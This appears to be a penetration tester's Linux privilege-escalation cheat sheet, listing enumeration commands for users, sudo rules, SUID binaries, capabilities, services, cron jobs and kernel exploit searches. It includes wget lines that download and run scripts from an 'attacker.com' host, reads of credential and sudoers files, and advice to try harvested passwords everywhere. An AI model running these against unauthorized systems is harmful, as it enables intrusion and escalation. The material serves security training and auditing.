# Linux Privilege Escalation

## Things to remember
  *  Beyond searching for a privesc vector, these checks help establish awareness
  *  Always check R/W perms on interesting files
      *  [Path resolution](https://linux.die.net/man/2/path_resolution) checks permissions against all directories in a path
      *  The read permission on a directory makes it listable, the execute permission makes it traversable
  *  Look for other ways to interact with local services/service binaries... get creative!
  *  Interesting binary? No `GTFOBins` entry? Not a standard utility? Reverse!

## Useful tools
  *  [`linPEAS`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and [`unix-privesc-check`](https://pentestmonkey.net/tools/audit/unix-privesc-check) for automated enum
  *  [`pspy`](https://github.com/DominicBreuker/pspy) for monitoring process/filesystem activity in real time
  *  [`GTFOBins`](https://gtfobins.github.io/) for abuse techniques using various binaries/programs
  *  [`linux-exploit-suggester`](https://github.com/The-Z-Labs/linux-exploit-suggester) for suggesting Linux kernel exploits

## Automation
  *  Cover a lot of ground and make a lot of noise
      *  Consider low and slow manual enumeration to avoid prying eyes

```
wget http://attacker.com/linpeas.sh && sh linpeas.sh | tee linpeas.txt
wget http://192.168.119.231/unix-privesc-check && chmod +x ./unix-privesc-check && ./unix-privesc-check standard | tee unix-privesc-check.txt
```

## Whoami
  *  Identify the newly owned user
      *  Watch for groups of interest `sudo`, `docker`, etc.

```
whoami
id
groups
```

## Users, groups, and sessions
  *  Identify target users, groups, and sessions
      *  Watch for groups of interest `lxd`, `docker`, etc.
      *  Search readable/writable files in `/home` directories  

```
cat /etc/passwd | cut -d: -f1
cat /etc/passwd | grep -vE 'nologin|false' | cut -d: -f1
ls -la /home/
for user in $(cat /etc/passwd | cut -d: -f1); do groups $user; done
for user in $(cat /etc/passwd | grep -vE 'nologin|false' | cut -d: -f1); do groups $user; done
last
who
w
```

## System information
  *  General information about the local system
      *  `searchsploit`/`Google` all the things
      *  Establish awareness before hunting for specific vectors
      *  Watch for interesting software/services

// Hostname
```
hostname
```

// Distro, arch, kernel version/modules
```
lsb_release -a
cat /etc/issue
cat /etc/*-release
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

// Environment variables/aliases
```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
alias
```

// Installed applications/running processes
```
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
ps aux
ps -ef
ps aux | grep root
```

// Disks and partitions
```
mount
/etc/fstab
fdisk -l
/bin/lsblk
```

## Network information
  *  Enumerate information about the network configuration of the system
      *  Lots of info here develops awareness of systems position within the network
  *  Search for opportunities to abuse network services running on the system
      *  Check for network services running with higher privileges
      *  **Check R/W perms over files/dirs of network services**

// Interfaces and DNS configuration
```
/sbin/ifconfig -a
ip a
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/resolv.conf
cat /etc/networks
dnsdomainname
```

// Connections and network services
```
netstat -ano
ss -anp
ss -antlp
lsof -i
lsof -i :80
grep 80 /etc/services
```

// Routing table and ARP cache
```
/sbin/route
/sbin/route -nee
ip r
arp -e
ip neigh
```

## Insecure credentials
  *  Have any passwords? **TRY THEM ALL, EVERYWHERE**
      *  Also try weak creds such as blank password, username as password, etc.
      *  Remember guesswork methodology: find words of interest!

## [Sudo](https://man7.org/linux/man-pages/man8/sudo.8.html)
  *  Exploit `sudo` version/misconfigs and allowed `sudo` commands
      *  Watch for [`LD_PRELOAD` and `LD_LIBRARY_PATH`](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)
      *  Watch for writable `secure_path` directories for PATH hijacking
  *  Consider the intended functions of allowed commands in a higher privilege context
  *  Sudo tokens can also be exploited/created under certain conditions
      *  Watch for [sudo tokens in other shells](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens) for your current user
      *  Watch for writable `sudo` [token](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#var-run-sudo-ts-less-than-username-greater-than)/[config](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d) locations

```
sudo -V
sudo -l
cat /etc/sudoers
find /var/run/sudo/ts/ -writable 2>/dev/null
ls -l /etc/sudoers /etc/sudoers.d
ls -ld /etc/sudoers.d
```

## [SUID/SGID](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)
  *  [Abuse `SUID`/`SGID`](https://www.thehacker.recipes/infra/privilege-escalation/unix/suid-sgid-binaries) enabled programs for code exec as the file owner
      *  Watch for invocations using relative paths for PATH hijacking
  *  Consider the intended functions of the program in a higher privilege context

```
find / -perm -u=s -type f 2>/dev/null  
find / -perm -g=s -type f 2>/dev/null  
```

## [Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
  *  [Abuse enabled capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities) of a program/process 
      *  Watch for invocations using relative paths for PATH hijacking
      *  Capabilities exist for more than just binary programs!
  *  Consider the intended functions of the object in the context of the enabled capability

```
cat /etc/security/capability.conf
getcap -r / 2>/dev/null
```

## [Services](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/chap-managing_services_with_systemd)
  *  Hunt for writable service [config/program files](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services)
      *  Watch for invocations using relative paths for PATH hijacking
      *  Check for read/write permissions on all service dirs/files

```
systemctl list-unit-files
find / -writable -name *.service 2>/dev/null
for file in $(find / -readable -name *.service 2>/dev/null); do grep Exec $file; done
```

## [Cron jobs](https://man7.org/linux/man-pages/man8/cron.8.html)
  *  [Abuse misconfigured cron jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs) for code exec as the configured user
      *  Watch for cron job command using wildcards
      *  Check R/W perms against cron config/command/PATH variable locations
  *  `pspy` for exposing cron jobs via process monitoring

```
cat /etc/crontab
crontab -l
ls -lah /etc/cron*
grep "CRON" /var/log/cron.log
```

```
wget http://attacker.com/pspy64 && chmod +x pspy64 && ./pspy64
```

## Finding files of interest
  *  [`find`](https://man7.org/linux/man-pages/man1/find.1.html) for recursively searching files based on permissions
  *  Interesting filesystem contents to search for:
      *  Anything in `/etc` not owned by root/shadow
      *  All writable files/directories
      *  Media or mounts in `/media` and `/mnt`
      *  Writable directories under any PATH variable

```
ls -la /etc
find /home -readable 2>/dev/null
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -user root -writable 2>/dev/null
find / -group admins -readable 2>/dev/null
find / -name "*phpmyadmin*" 2>/dev/null
find / -name "*.htpasswd" 2>/dev/null
for dir in $(echo $PATH | awk '{split($0,n,":");for(i=0;++i<=length(n);) print(n[i])}'); do [ -w $dir ] && echo $dir; done
```

## Kernel exploits
  *  Enumerate distro/kernel details and search accordingly
      *  Enumerate kernel hardening features with `LES`
  *  `Google`, `searchsploit`, and `linux-exploit-suggester` for finding Linux kernel exploits
  *  Compile exploits for different/older kernels within `docker` or a VM

```
bash linux-exploit-suggester.sh
bash linux-exploit-suggester.sh --checksec
```
